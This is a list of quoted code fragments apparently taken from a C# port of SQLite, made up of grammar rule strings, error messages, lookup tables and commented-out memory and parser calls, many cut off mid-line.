"/ ""expr ::= expr COLLATE ids"","
"/ ""expr ::= expr CONCAT expr"","
"/ ""expr ::= expr EQ"
"/ ""expr ::= expr IS NOT NULL"","
"/ ""expr ::= expr IS NULL"","
"/ ""expr ::= expr ISNULL"
"/ ""expr ::= expr LT"
"/ ""expr ::= expr NOT NULL"","
"/ ""expr ::= expr OR expr"","
"/ ""expr ::= expr PLUS"
"/ ""expr ::= expr STAR"
"/ ""expr ::= expr between_op expr AND expr"","
"/ ""expr ::= expr in_op LP exprlist RP"","
"/ ""expr ::= expr in_op LP select RP"","
"/ ""expr ::= expr in_op nm dbnm"","
"/ ""expr ::= expr likeop expr escape"","
"/ ""expr ::= id"","
"/ ""expr ::= nm DOT nm DOT nm"","
"/ ""expr ::= nm DOT nm"","
"/ ""expr ::= term"","
"/ ""exprlist ::= nexprlist"","
"/ ""exprlist ::="","
"/ ""file is encrypted or is not a database"","
"/ ""foreach_clause ::= FOR EACH ROW"","
"/ ""foreach_clause ::="","
"/ ""from ::= FROM seltablist"","
"/ ""from ::="","
"/ ""fullname ::= nm dbnm"","
"/ ""groupby_opt ::= GROUP BY nexprlist"","
"/ ""groupby_opt ::="","
"/ ""having_opt ::= HAVING expr"","
"/ ""having_opt ::="","
"/ ""id ::= ID"","
"/ ""id ::= INDEXED"","
"/ ""ids ::= ID"
"/ ""idxlist ::= idxlist COMMA nm collate sortorder"","
"/ ""idxlist ::= nm collate sortorder"","
"/ ""idxlist_opt ::= LP idxlist RP"","
"/ ""idxlist_opt ::="","
"/ ""ifexists ::= IF EXISTS"","
"/ ""ifexists ::="","
"/ ""ifnotexists ::= IF NOT EXISTS"","
"/ ""ifnotexists ::="","
"/ ""in_op ::= IN"","
"/ ""in_op ::= NOT IN"","
"/ ""indexed_opt ::= INDEXED BY nm"","
"/ ""indexed_opt ::= NOT INDEXED"","
"/ ""indexed_opt ::="","
"/ ""init_deferred_pred_opt ::= INITIALLY DEFERRED"","
"/ ""init_deferred_pred_opt ::= INITIALLY IMMEDIATE"","
"/ ""init_deferred_pred_opt ::="","
"/ ""input ::= cmdlist"","
"/ ""inscollist ::= inscollist COMMA nm"","
"/ ""inscollist ::= nm"","
"/ ""inscollist_opt ::= LP inscollist RP"","
"/ ""inscollist_opt ::="","
"/ ""insert_cmd ::= INSERT orconf"","
"/ ""insert_cmd ::= REPLACE"","
"/ ""interrupted"","
"/ ""itemlist ::= expr"","
"/ ""itemlist ::= itemlist COMMA expr"","
"/ ""joinop ::= COMMA"
"/ ""joinop ::= JOIN_KW JOIN"","
"/ ""joinop ::= JOIN_KW nm JOIN"","
"/ ""joinop ::= JOIN_KW nm nm JOIN"","
"/ ""key_opt ::= KEY expr"","
"/ ""key_opt ::="","
"/ ""kwcolumn_opt ::= COLUMNKW"","
"/ ""kwcolumn_opt ::="","
"/ ""large file support is disabled"","
"/ ""library routine called out of sequence"","
"/ ""likeop ::= LIKE_KW"","
"/ ""likeop ::= MATCH"","
"/ ""likeop ::= NOT LIKE_KW"","
"/ ""likeop ::= NOT MATCH"","
"/ ""limit_opt ::= LIMIT expr COMMA expr"","
"/ ""limit_opt ::= LIMIT expr OFFSET expr"","
"/ ""limit_opt ::= LIMIT expr"","
"/ ""limit_opt ::="","
"/ ""lp ::= LP"","
"/ ""minus_num ::= MINUS number"","
"/ ""multiselect_op ::= EXCEPT"
"/ ""multiselect_op ::= UNION ALL"","
"/ ""multiselect_op ::= UNION"","
"/ ""nexprlist ::= expr"","
"/ ""nexprlist ::= nexprlist COMMA expr"","
"/ ""nm ::= JOIN_KW"","
"/ ""nm ::= STRING"","
"/ ""nm ::= id"","
"/ ""nmnum ::= DEFAULT"","
"/ ""nmnum ::= DELETE"","
"/ ""nmnum ::= ON"","
"/ ""nmnum ::= nm"","
"/ ""nmnum ::= plus_num"","
"/ ""not an error"","
"/ ""number ::= INTEGER"
"/ ""on_opt ::= ON expr"","
"/ ""on_opt ::="","
"/ ""onconf ::= ON CONFLICT resolvetype"","
"/ ""onconf ::="","
"/ ""oneselect ::= SELECT distinct selcollist from where_opt groupby_opt having_opt orderby_opt limit_opt"","
"/ ""orconf ::= OR resolvetype"","
"/ ""orconf ::="","
"/ ""orderby_opt ::= ORDER BY sortlist"","
"/ ""orderby_opt ::="","
"/ ""out of memory"","
"/ ""plus_num ::= plus_opt number"","
"/ ""plus_opt ::= PLUS"","
"/ ""plus_opt ::="","
"/ ""raisetype ::= ABORT"","
"/ ""raisetype ::= FAIL"","
"/ ""raisetype ::= ROLLBACK"","
"/ ""refact ::= CASCADE"","
"/ ""refact ::= RESTRICT"","
"/ ""refact ::= SET DEFAULT"","
"/ ""refact ::= SET NULL"","
"/ ""refarg ::= MATCH nm"","
"/ ""refarg ::= ON DELETE refact"","
"/ ""refarg ::= ON INSERT refact"","
"/ ""refarg ::= ON UPDATE refact"","
"/ ""refargs ::= refargs refarg"","
"/ ""refargs ::="","
"/ ""resolvetype ::= IGNORE"","
"/ ""resolvetype ::= REPLACE"","
"/ ""resolvetype ::= raisetype"","
"/ ""savepoint_opt ::= SAVEPOINT"","
"/ ""savepoint_opt ::="","
"/ ""sclp ::= selcollist COMMA"","
"/ ""sclp ::="","
"/ ""selcollist ::= sclp STAR"","
"/ ""selcollist ::= sclp expr as"","
"/ ""selcollist ::= sclp nm DOT STAR"","
"/ ""select ::= oneselect"","
"/ ""select ::= select multiselect_op oneselect"","
"/ ""seltablist ::= stl_prefix LP select RP as on_opt using_opt"","
"/ ""seltablist ::= stl_prefix LP seltablist RP as on_opt using_opt"","
"/ ""seltablist ::= stl_prefix nm dbnm as indexed_opt on_opt using_opt"","
"/ ""setlist ::= nm EQ expr"","
"/ ""setlist ::= setlist COMMA nm EQ expr"","
"/ ""signed ::= minus_num"","
"/ ""signed ::= plus_num"","
"/ ""sortitem ::= expr"","
"/ ""sortlist ::= sortitem sortorder"","
"/ ""sortlist ::= sortlist COMMA sortitem sortorder"","
"/ ""sortorder ::= ASC"","
"/ ""sortorder ::= DESC"","
"/ ""sortorder ::="","
"/ ""stl_prefix ::= seltablist joinop"","
"/ ""stl_prefix ::="","
"/ ""string or blob too big"","
"/ ""table contains no data"","
"/ ""tcons ::= CHECK LP expr RP onconf"","
"/ ""tcons ::= CONSTRAINT nm"","
"/ ""tcons ::= FOREIGN KEY LP idxlist RP REFERENCES nm idxlist_opt refargs defer_subclause_opt"","
"/ ""tcons ::= PRIMARY KEY LP idxlist autoinc RP onconf"","
"/ ""tcons ::= UNIQUE LP idxlist RP onconf"","
"/ ""temp ::= TEMP"","
"/ ""temp ::="","
"/ ""term ::= CTIME_KW"","
"/ ""term ::= INTEGER"
"/ ""term ::= NULL"","
"/ ""term ::= STRING"","
"/ ""trans_opt ::= TRANSACTION nm"","
"/ ""trans_opt ::= TRANSACTION"","
"/ ""trans_opt ::="","
"/ ""transtype ::= DEFERRED"","
"/ ""transtype ::= EXCLUSIVE"","
"/ ""transtype ::= IMMEDIATE"","
"/ ""transtype ::="","
"/ ""tridxby ::= INDEXED BY nm"","
"/ ""tridxby ::= NOT INDEXED"","
"/ ""tridxby ::="","
"/ ""trigger_cmd ::= DELETE FROM trnm tridxby where_opt"","
"/ ""trigger_cmd ::= UPDATE orconf trnm tridxby SET setlist where_opt"","
"/ ""trigger_cmd ::= insert_cmd INTO trnm inscollist_opt VALUES LP itemlist RP"","
"/ ""trigger_cmd ::= insert_cmd INTO trnm inscollist_opt select"","
"/ ""trigger_cmd ::= select"","
"/ ""trigger_cmd_list ::= trigger_cmd SEMI"","
"/ ""trigger_cmd_list ::= trigger_cmd_list trigger_cmd SEMI"","
"/ ""trigger_decl ::= temp TRIGGER ifnotexists nm dbnm trigger_time trigger_event ON fullname foreach_clause when_clause"","
"/ ""trigger_event ::= DELETE"
"/ ""trigger_event ::= UPDATE OF inscollist"","
"/ ""trigger_event ::= UPDATE"","
"/ ""trigger_time ::= AFTER"","
"/ ""trigger_time ::= BEFORE"","
"/ ""trigger_time ::= INSTEAD OF"","
"/ ""trigger_time ::="","
"/ ""trnm ::= nm DOT nm"","
"/ ""trnm ::= nm"","
"/ ""type ::= typetoken"","
"/ ""type ::="","
"/ ""typename ::= ids"","
"/ ""typename ::= typename ids"","
"/ ""typetoken ::= typename LP signed COMMA signed RP"","
"/ ""typetoken ::= typename LP signed RP"","
"/ ""typetoken ::= typename"","
"/ ""unable to open database file"","
"/ ""uniqueflag ::= UNIQUE"","
"/ ""uniqueflag ::="","
"/ ""using_opt ::= USING LP inscollist RP"","
"/ ""using_opt ::="","
"/ ""vtabarg ::= vtabarg vtabargtoken"","
"/ ""vtabarg ::="","
"/ ""vtabarglist ::= vtabarg"","
"/ ""vtabarglist ::= vtabarglist COMMA vtabarg"","
"/ ""vtabargtoken ::= ANY"","
"/ ""vtabargtoken ::= lp anylist RP"","
"/ ""when_clause ::= WHEN expr"","
"/ ""when_clause ::="","
"/ ""where_opt ::= WHERE expr"","
"/ ""where_opt ::="","
"/ 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x04, 0x04,"
"/ 0x00, 0x00, 0x01, 0x02, 0x08, 0x11, 0x00, 0x02,"
"/ 0x00, 0x00, 0x02, 0x11, 0x11, 0x02, 0x05, 0x00,"
"/ 0x00, 0x00, 0x2c, 0x2c, 0x05, 0x00, 0x11, 0x05,"
"/ 0x00, 0x01, 0x00, 0x00, 0x10, 0x08, 0x02, 0x00,"
"/ 0x00, 0x02, 0x01, 0x11, 0x00, 0x00, 0x05, 0x00,"
"/ 0x00, 0x04, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00,"
"/ 0x00, 0x04, 0x02, 0x00, 0x02, 0x04, 0x00, 0x00,"
"/ 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,"
"/ 0x01, 0x02, 0x00, 0x00, 0x04, 0x00, 0x00, 0x11,"
"/ 0x02, 0x00, 0x01, 0x04, 0x04, 0x00, 0x00, 0x05,"
"/ 0x02, 0x01, 0x21, 0x08, 0x00, 0x02, 0x01, 0x11,"
"/ 0x02, 0x11, 0x04, 0x00, 0x00, 0x0c, 0x11, 0x01,"
"/ 0x02, 0x15, 0x00, 0x00, 0x10, 0x00, 0x00, 0x02,"
"/ 0x04, 0x04,"
"/ 0x05, 0x15, 0x15, 0x15, 0x15, 0x15, 0x15, 0x00,"
"/ 0x11, 0x05, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00,"
"/ 0x2c, 0x2c, 0x00, 0x00, 0x00, 0x04, 0x02, 0x00,"
"/ 0x2c, 0x2c, 0x2c, 0x2c, 0x2c, 0x2c, 0x2c, 0x2c,"
"/ new Keyword( 0,  7, JT_NATURAL                ),"
"/ new Keyword( 10, 5, JT_OUTER                  ),"
"/ new Keyword( 14, 5, JT_RIGHT"
"/ new Keyword( 19, 4, JT_LEFT"
"/ new Keyword( 23, 5, JT_INNER                  ),"
"/ new Keyword( 28, 5, JT_INNER"
"/ new Keyword( 6,  4, JT_LEFT"
"/ new u8[] {    0,  0,     1,      2,      3,    1,       1,   1,  },"
"/ sqlite3ResolveExprNames( sNC, ref whenExpr ) != 0 )"
"/ sqliteProcessJoin( pParse, p ) != 0 )"
"/ {    0,  0,     1, },"
"/ {    0,  1,     1, },"
"//                             ""cannot open indexed column for writing"")"
"//            sqlite3DbFree(db, zErr)"
"//            zErr = sqlite3MPrintf(db,"
"//          memcpy(data[cellbody], apCell[i], aSize[i])"
"//          sqlite3DbReallocOrFree( pParse.db, pParse.aTableLock, nBytes )"
"//        //sqlite3DbFree(db, zErr)"
"//        CODEC2(pPager, pData, pPg->pgno, 7, return SQLITE_NOMEM, pData2)"
"//        sqlite3_snprintf(sizeof(zErr), zErr, ""%s"", sParse.zErrMsg)"
"//      //sqlite3DbFree(db,pBlob)"
"//      READ_UTF16BE(zIn, c)"
"//      READ_UTF16LE(zIn, c)"
"//      WRITE_UTF16BE(z, c)"
"//      WRITE_UTF16LE(z, c)"
"//      WRITE_UTF8(z, c)"
"//      if( sqlite3StrICmp(pTab.aCol[iCol].zName, zColumn)==0 ){"
"//      int iDb = sqlite3SchemaToIndex(db, pTab.pSchema)"
"//      pStmt, N, (const void"
"//      sqlite3DbFree(db, zErr)"
"//      sqlite3DbMallocRaw(db, sizeof("
"//      sqlite3DbReallocOrFree( pMem.db, pMem.z, n )"
"//      sqlite3ErrorMsg(pParse, ""cannot open view: %s"", zTable)"
"//      sqlite3ErrorMsg(pParse, ""cannot open virtual table: %s"", zTable)"
"//      sqlite3StackFree(db, pParse)"
"//      sqlite3VdbeAddOpList(v, sizeof(openBlob)/sizeof(VdbeOpList), openBlob)"
"//      sqlite3VdbeChangeP1(v, 0, iDb)"
"//      sqlite3VdbeChangeP1(v, 1, iDb)"
"//      sqlite3VdbeChangeP1(v, 2, iDb)"
"//      sqlite3VdbeChangeP2(v, 0, flags)"
"//      sqlite3VdbeChangeP2(v, 1, pTab.pSchema.schema_cookie)"
"//      sqlite3VdbeChangeP2(v, 2, pTab->tnum)"
"//      sqlite3VdbeChangeP2(v, 3 "
"//      sqlite3VdbeChangeP2(v, 7, pTab->nCol)"
"//      sqlite3VdbeChangeP3(v, 2, flags)"
"//      sqlite3VdbeChangeP3(v, 3 "
"//      sqlite3VdbeChangeP4(v, 2, pTab->zName, P4_TRANSIENT)"
"//      sqlite3VdbeChangeP4(v, 3"
"//      sqlite3VdbeChangeToNoop(v, 4 - flags, 1)"
"//      sqlite3VdbeUsesBtree(v, iDb)"
"//      zErr = sqlite3MPrintf(db, ""cannot open value of type %s"","
"//      zErr = sqlite3MPrintf(db, ""no such column: "
"//      zErr = sqlite3MPrintf(db, sqlite3_errmsg(db))"
"//     CODEC2(pPager, pList->pData, pgno, 6, return SQLITE_NOMEM, pData)"
"//    //sqlite3DbFree(db,ref zName8)"
"//    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  /"
"//    0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0,  /"
"//    0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0,  /"
"//    0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1,  /"
"//    0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0,  /"
"//    0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0,  /"
"//    0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0,  /"
"//    0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0,  /"
"//    0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1,  /"
"//    1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0,  /"
"//    1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0,  /"
"//    UnlockFile(pFilE.h, PENDING_BYTE, 0, 1, 0)"
"//    btreeParseCell(pCur.apPage[iPage],pCur.aiIdx[iPage],"
"//    memset(pParse, 0, sizeof(Parse))"
"//    pTab = sqlite3LocateTable(pParse, 0, zTable, zDb)"
"//    rc = createCollation(db, zName8, enc, pCtx, xCompare, 0)"
"//    rc = xCall(p.pCsr, iOffset"
"//    sqlite3DbFree(db, p)"
"//    sqlite3DbFree(db, zErr)"
"//    sqlite3VdbeMakeReady(v, 1, 1, 1, 0)"
"//    static const Mem nullMem = {{0}, (double)0, 0, """", 0, MEM_Null, SQLITE_NULL, 0, 0, 0 }"
"//    strftime(zBuf, 20, zFormat, pTm)"
"//    strftime(zBuf, 20, zFormat, sNow)"
"//    zErr = sqlite3MPrintf(db, ""no such rowid: %lld"", iRow)"
"//    {OP_Close, 0, 0, 0},           /"
"//    {OP_Column, 0, 0, 1},          /"
"//    {OP_Halt, 0, 0, 0},            /"
"//    {OP_NotExists, 0, 9, 1},       /"
"//    {OP_OpenRead, 0, 0, 0},        /"
"//    {OP_OpenWrite, 0, 0, 0},       /"
"//    {OP_ResultRow, 1, 0, 0},       /"
"//    {OP_Transaction, 0, 0, 0},     /"
"//    {OP_Variable, 1, 1, 1},        /"
"//    {OP_VerifyCookie, 0, 0, 0},    /"
"//   0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  /"
"//   0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0, 95,  0,  0,  /"
"//   0,  0,115,116,117,118,119,120,121,122,  0,  0,  0,  0,  0,  0,  /"
"//   0, 97, 98, 99,100,101,102,103,104,105,  0,  0,  0,  0,  0,  0,  /"
"//   0,106,107,108,109,110,111,112,113,114,  0,  0,  0,  0,  0,  0,  /"
"//   sqlite3DbMallocRaw( pMem.db, n )"
"//  0,"
"//  GLOBAL(struct sqlite3PrngType, sqlite3Prng).isInit = 0"
"//  int argc,"
"//  int chars_parsed = sqlite3Utf8CharLen(zSql8, (int)(zTail8-zSql8))"
"//  int enc,"
"//  int flags,              /"
"//  int iOffset,"
"//  int n,"
"//  memcpy(pTo, pFrom, MEMCELLSIZE)"
"//  pParse = sqlite3StackAllocRaw(db, sizeof("
"//  rc = sqlite3ApiExit(db, rc)"
"//  return blobReadWrite(pBlob, (void "
"//  return blobReadWrite(pBlob, z, n, iOffset, sqlite3BtreeData)"
"//  sqlite3 db,"
"//  sqlite3DbFree(db, zErr)"
"//  sqlite3Error(db, SQLITE_ERROR, 0)"
"//  sqlite3Error(db, rc, zErr)"
"//  sqlite3MutexAlloc,"
"//  sqlite3StackFree(db, pParse)"
"//  sqlite3VdbeMemSetStr(pCtx.s, z, n, SQLITE_UTF16NATIVE, SQLITE_TRANSIENT)"
"//  sqlite3_blob pBlob,"
"//  sqlite3_mutex_enter,"
"//  sqlite3_mutex_free,"
"//  sqlite3_mutex_leave,"
"//  sqlite3_mutex_try,"
"//  sqlite3_result_text(context, zBuf, -1, SQLITE_TRANSIENT)"
"//  sqlite3_snprintf(n-k, zStmt[k], zSep)"
"//  sqlite_int64 iRow,      /"
"//  string zName,"
"//  void pCollNeededArg,"
"//  zName8 = sqlite3Utf16to8(db, zName, -1)"
"// (sqlite3_mem_methods)va_arg( ap, ""sqlite3_mem_methods"" )"
"// (sqlite3_mutex_methods)va_arg( ap, ""sqlite3_mutex_methods"" )"
"// //sqlite3DbFree(db,ref pFKey)"
"// = sqlite3StackAllocRaw(0, sizeof(p->u.aHash))"
"// ArraySize(readCookie), readCookie)"
"// COM, set the ComVisible attribute to true on that type."
"// GetVarint( aKey, szHdr )"
"// GetVarint( aKey1, szHdr1 )"
"// UnlockFile(pFilE.h, RESERVED_BYTE, 0, 1, 0)"
"// contextMalloc(context, ((i64)i)"
"// contextMalloc(context, ((i64)n)"
"// getValue( zDate, ref r )"
"// memcpy( pPayload, pBuf, nByte )"
"// memcpy( z, pName.z, pName.n )"
"// memcpy( zExtra, zColl, nColl )"
"// memcpy( zOut, zIn, nCopy )"
"// memcpy( zToken, p.u.zToken, nToken )"
"// memcpy(aiValues, p->u.aHash, sizeof(p->u.aHash))"
"// memcpy(data, zMagicHeader, sizeof(zMagicHeader))"
"// memcpy(db.aDbStatic, db.aDb, 2"
"// memcpy(pC.pData, pData.z, pC.nData)"
"// memcpy(pData, aData, pPager.pageSize)"
"// memcpy(pMem.r, x, sizeof(x))"
"// memcpy(pPager.dbFileVers, pData[24], pPager.dbFileVers).Length"
"// memcpy(pTo, pFrom, MEMCELLSIZE)"
"// memcpy(pTo, pFrom, Mem).Length"
"// memcpy(zHeader, aJournalMagic, sizeof(aJournalMagic))"
"// memset( pCache.pPage1.pData, 0, pCache.szPage )"
"// memset( pV, 0, ( sz "
"// memset( zBuf, 0, nBuf )"
"// memset(p->u.aHash, 0, sizeof(p->u.aHash))"
"// memset(pUsage, 0, sizeof(pUsage[0])"
"// memset(sAggInfo, 0, sAggInfo).Length"
"// memset(sNC, 0, sizeof(sNC))"
"// memset(sSrc, 0, sizeof(sSrc))"
"// sqlite3DbMallocRaw( db, n )"
"// sqlite3DbMallocRaw( db, sizeof( Savepoint ) "
"// sqlite3DbMallocRaw( db, sizeof( int ) "
"// sqlite3DbMallocRaw(db, sizeof(int) "
"// sqlite3DbMallocSize(db, a)/sizeof(a[0])"
"// sqlite3DbMallocZero( db, sizeof( Table ) )"
"// sqlite3DbMallocZero( db, sizeof( TriggerStep ) "
"// sqlite3DbMallocZero( db, sizeof(TriggerStep ))"
"// sqlite3DbMallocZero(db, Table).Length"
"// sqlite3DbMallocZero(db, Vdbe).Length"
"// sqlite3DbReallocOrFree( db, p.contextStack,"
"// sqlite3DbStrDup( 0, zErrmsg )"
"// sqlite3DbStrDup( db, columnType( sNC, p, 0, 0, 0 ) )"
"// sqlite3DbStrDup( db, db.aDb[iDb].zName )"
"// sqlite3DbStrDup( db, pColl.zName )"
"// sqlite3DbStrDup( db, pExpr.u.zToken )"
"// sqlite3DbStrDup( db, pOldItem.zIndex )"
"// sqlite3DbStrDup( db, pOldItem.zSpan )"
"// sqlite3DbStrDup( db, pTableName.a[0].zName )"
"// sqlite3DbStrDup( db, pView.zName )"
"// sqlite3DbStrDup( db, zName )"
"// sqlite3DbStrDup( db, zSpan )"
"// sqlite3DbStrDup( db, zToken )"
"// sqlite3DbStrDup( pFix.pParse.db, zDb )"
"// sqlite3DbStrDup(db, ""database schema has changed"")"
"// sqlite3DbStrDup(db, pOldItem.zAlias)"
"// sqlite3DbStrDup(db, pOldItem.zDatabase)"
"// sqlite3DbStrDup(db, pOldItem.zName)"
"// sqlite3DbStrDup(db, zErr)"
"// sqlite3DbStrDup(db, zName)"
"// sqlite3DbStrNDup( db, pSpan.zStart,"
"// sqlite3DbStrNDup(db, zSql, nBytes)"
"// sqlite3DbStrNDup(p.db, z, n)"
"// sqlite3DbStrNDup(p.db, zP4, n)"
"// sqlite3Put4byte( aData, 4, k - 1 )"
"// sqlite3RowSetInit( db, pMem.zMalloc,"
"//!(DbHasProperty(db, 0, DB_SchemaLoaded)) "
"//(int)ENC(db), zExternal)"
"//0,"
"//CODEC2(pPager, pData, pPg.pgno, 7, return SQLITE_NOMEM, pData2)"
"//DbHasProperty(db, 0, DB_Empty)"
"//Expr pRowidExpr,    /"
"//ExprList pChanges,  /"
"//Parse pParse,       /"
"//READ_UTF8(zIn, zTerm, c)"
"//SQLITE_INT_TO_PTR( pTab.nCol ), P4_INT32 )"
"//SQLITE_INT_TO_PTR(iSet), P4_INT32)"
"//Schema.Length, sqlite3SchemaFree)"
"//SrcList pSrc,       /"
"//Table pTab,         /"
"//aNew = sqlite3DbRealloc(db, db.aDb, sizeof(db.aDb[0])"
"//a[N_SORT_BUCKET], p"
"//contextMalloc(context, ((i64)nChar)"
"//getValue( z, ref r )"
"//getVarint32(zIdx, aType[i])"
"//int aXRef,          /"
"//int sqlite3VtabSync(sqlite3 db, int rc)"
"//int sqlite3_blob_read(sqlite3_blob pBlob, void "
"//int sqlite3_blob_write(sqlite3_blob pBlob, const void "
"//memcmp(info, pCur.info, sizeof(info))==0 )"
"//memcpy( apCell[nCell], ref pOld.aData[8], 4 )"
"//memcpy( buf, pMem.z, len )"
"//memcpy( data[cellbody], apCell[i], aSize[i] )"
"//memcpy( pNew.aData[8], pCell, 4 )"
"//memcpy( pNewTrunk.aData[8], ref pTrunk.aData[12], ( k - 1 ) "
"//memcpy( pPage1.aData[32], ref pTrunk.aData[0], 4 )"
"//memcpy( pTemp, apDiv[i], sz )"
"//memcpy( temp[cbrk], ref data[cbrk], usableSize - cbrk )"
"//memcpy(aTo[iData], ref aFrom[iData], pBt.usableSize-iData)"
"//memcpy(aTo[iToHdr], ref aFrom[iFromHdr], pFrom.cellOffset "
"//memcpy(aiValues, p->u.aHash, sizeof(p->u.aHash))"
"//memcpy(data[cbrk], ref temp[pc], size)"
"//memcpy(db.aLimit, aHardLimit, sizeof(db.aLimit))"
"//memcpy(pBuf, pPayload, nByte)"
"//memcpy(pChild.aOvfl, pRoot.aOvfl, pRoot.nOverflow"
"//memcpy(pMem, "
"//memcpy(pMem.z, z, nAlloc)"
"//memcpy(pNew.u.zToken, pToken.z, pToken.n)"
"//memcpy(pPayload, pSrc, n)"
"//memcpy(z, argv[i], n)"
"//memmove(pMem.z, pMem.z[2], pMem.n)"
"//memset( pPage, 0, sizeof( PgHdr ) "
"//memset(a, 0, sizeof(a))"
"//memset(aNew, 0, sizeof("
"//memset(apOld, 0, (i"
"//memset(db.aDb[j], 0, (db.nDb-j)"
"//memset(info, 0, sizeof(info))"
"//memset(p, 0, sizeof("
"//memset(p, 0, sizeof(PCache))"
"//memset(p->u.apSub, 0, sizeof(p->u.apSub))"
"//memset(pCost, 0, sizeof("
"//memset(pItem, 0, sizeof("
"//memset(pMem.z, 0, n)"
"//memset(pOp, 0, sizeof(pOp[0]))"
"//memset(pPg->pData, 0, pPager.pageSize)"
"//memset(pPg.pExtra, 0, pPager.nExtra)"
"//memset(pSubSrc.a[i], 0, sizeof(pSubSrc.a[i]))"
"//memset(pVdbeFunc.apAux[nAux], 0, sizeof(struct AuxData)"
"//pNew = realloc(p.yystack, newSize"
"//res = LockFile(pFile.fs.SafeFileHandle.DangerousGetHandle().ToInt32(), RESERVED_BYTE, 0, 1, 0)"
"//sqlite3DbFree( db, ref p.u._zToken )"
"//sqlite3DbFree( db, ref pKey )"
"//sqlite3DbFree( db, ref pParse.aTableLock )"
"//sqlite3DbFree( db, ref pTmp )"
"//sqlite3DbFree( db, ref pTrigger )"
"//sqlite3DbFree( p.pKeyInfo.db, ref p )"
"//sqlite3DbFree(db, p.zErrMsg)"
"//sqlite3DbFree(db, pOp->p4.z)"
"//sqlite3DbFree(db, zErrMsg)"
"//sqlite3DbFree(db,p)"
"//sqlite3DbFree(db,p.zBuf)"
"//sqlite3DbFree(db,pParse.apVtabLock)"
"//sqlite3DbFree(db,ref pMod)"
"//sqlite3DbFree(db,ref zFunc8)"
"//sqlite3DbFree(db,ref zSql8)"
"//sqlite3DbFree(pParse.db, p)"
"//sqlite3DbFree(pParse.db, pVtab.zErrMsg)"
"//sqlite3DbMallocRaw( db, dupedExprSize( p, flags ) )"
"//sqlite3DbMallocRaw(db,  p.nExpr"
"//sqlite3DbMallocRaw(db, nByte )"
"//sqlite3DbMallocRaw(db, p.nId"
"//sqlite3DbMallocRaw(db, sizeof("
"//sqlite3DbMallocRaw(p.db, sizeof("
"//sqlite3DbMallocRaw(pKeyInfo.db, nByte)"
"//sqlite3DbMallocRaw(pParse.db, sizeof("
"//sqlite3DbMallocSize(p.db, p.aLabel)/sizeof(p.aLabel[0])"
"//sqlite3DbMallocZero(db, 2"
"//sqlite3DbMallocZero(db, SrcList.Length )"
"//sqlite3DbMallocZero(db, nByte )"
"//sqlite3DbMallocZero(db, sizeof("
"//sqlite3DbMallocZero(db, sizeof(Expr)"
"//sqlite3DbMallocZero(db, sizeof(IdList))"
"//sqlite3DbMallocZero(db, sizeof(aCol[0])"
"//sqlite3DbMallocZero(db,"
"//sqlite3DbMallocZero(pParse.db, sizeof("
"//sqlite3DbRealloc(db, p, n)"
"//sqlite3DbStrDup(0, zRight)"
"//sqlite3DbStrDup(db, pEList->a[i].zSpan), SQLITE_DYNAMIC)"
"//sqlite3DbStrNDup( db, (char"
"//sqlite3DbStrNDup(db, (char"
"//sqlite3DbStrNDup(pParse.db, pName.z, pName.n)"
"//sqlite3StackAllocZero(db, sizeof("
"//sqlite3StackAllocZero(pErrorDb, sizeof("
"//sqlite3_realloc( p.azResult, sizeof(char"
"//sqlite3_realloc( res.azResult, sizeof(char"
"//sqlite3_snprintf(n-k, zStmt[k], ""%s"", zEnd)"
"//sqlite3_snprintf(nByte, pMem.z, ""%!.15g"", pMem->r)"
"//va_arg(ap, sqlite3_mem_methods"
"//va_arg(ap, sqlite3_pcache_methods"
"//void sqlite3PcacheIterateDirty(PCache pCache, void ("
"//void sqlite3_result_error16(sqlite3_context pCtx, const void "
"//zBuf[k], ""%d"", pMem.n )"
"//zErrmsg = sqlite3StackAllocZero(db, nMsg)"
"//zOut = sqlite3DbMallocRaw(pMem->db, len)"
"0"" )"
"0"" : ""(NULL)"
"0', 0, 0, 0)"
"0', N0, min0, max0, nextC0, ref  pVal0 )"
"0', N1, min1, max1, nextC1, ref  pVal1 )"
"0', N2, min2, max2, nextC2, ref  pVal2 )"
"0', false )"
"0', ref  m ) != 2 )"
"0', ref D ) != 3 )"
"0', ref nMn ) != 2 )"
"0', ref s ) != 1 )"
"0', true )"
"0,             /"
"0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,"
"0,   0,   0,   0,   4,   0,   0,   0,   0,   0,   0,   0,   0,"
"0,   0,   0,   0,  32,  21,   0,   0,   0,  42,   3,  46,   0,"
"0,   0,   0,  29,   0,   0,  37,   0,   0,   0,   1,  60,   0,"
"0,   0,   0,  30,  54,  16,  33,  10,   0,   0,   0,   0,   0,"
"0,   0,  11,  66,  73,   0,   8,   0,  98,  92,   0, 101,   0,"
"0,   0,"
"0,   2,   0,   0,   0,   0,   0,   0,  13,   0,   0,   0,   0,"
"0,   2,   2,   8,   9,  14,  16,  20,  23,  25,  25,  29,  33,"
"0,  /"
"0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15, /"
"0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15, 16, 17,"
"0,  61,   0,  40,   0,   0,   0,   0,   0,   0,   0,  59,   0,"
"0,  63,   6,   0,  47,  84,  96,   0, 113,  95,   0,   0,  44,"
"0,  97,  24,   0,  17,   0, 117,  48,  23,   0,   5, 104,  25,"
